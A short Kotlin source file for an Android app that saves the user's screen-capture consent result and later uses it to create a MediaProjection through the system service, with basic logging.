package com.sys.svc.helpers

import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import com.sys.svc.Logger

object MediaProjectionHolder {
    @Volatile private var resultCode: Int = 0
    @Volatile private var data: Intent? = null

    fun saveConsent(code: Int, intent: Intent) {
        resultCode = code
        data = intent
        Logger.i("Proj", "consent saved code=$code")
    }

    fun getConsent(): Pair<Int, Intent>? {
        val d = data ?: return null
        return resultCode to d
    }

    fun createProjection(ctx: Context): MediaProjection? {
        val (code, intent) = getConsent() ?: return null
        val mgr = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        return try {
            mgr.getMediaProjection(code, intent)
        } catch (e: Exception) {
            Logger.e("Proj", "create", e)
            null
        }
    }
}